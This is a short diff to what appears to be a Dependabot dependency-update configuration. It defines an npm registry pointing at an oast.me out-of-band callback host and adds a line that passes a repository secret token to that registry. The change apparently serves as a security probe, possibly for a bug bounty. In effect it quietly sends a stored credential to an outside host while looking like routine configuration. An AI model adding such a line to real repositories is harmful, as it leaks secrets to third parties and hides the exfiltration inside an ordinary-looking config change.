@@ -3,6 +3,7 @@ registries:
   bbtest-npm:
     type: npm-registry
     url: https://npm.d9qpa663586027ko0l00bsob14x4s381f.oast.me
+    token: ${{secrets.BBTEST_REG_TOKEN}}
 updates:
   - package-ecosystem: "npm"
     directory: "/"
